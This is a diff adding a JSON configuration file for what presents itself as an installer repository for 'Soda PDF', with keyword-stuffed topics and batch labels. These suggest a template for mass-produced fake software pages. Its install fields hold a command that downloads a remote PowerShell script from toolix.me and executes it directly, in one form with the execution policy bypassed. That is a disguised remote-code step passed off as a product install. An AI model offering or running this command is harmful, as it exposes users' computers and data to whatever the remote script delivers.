@@ -1,0 +1,26 @@
+{
+  "repo": "Soda-PDF-Install",
+  "product": "Soda PDF Install",
+  "product_title": "Soda PDF Install",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-soda-pdf-install",
+    "soda-pdf-install-app",
+    "repository-readme",
+    "install-guide",
+    "desktop-software",
+    "soda-pdf-install-desktop-tool",
+    "soda-pdf-install-windows-tool",
+    "soda-pdf-install",
+    "windows-11",
+    "windows-desktop"
+  ],
+  "site": "toolix.me"
+}
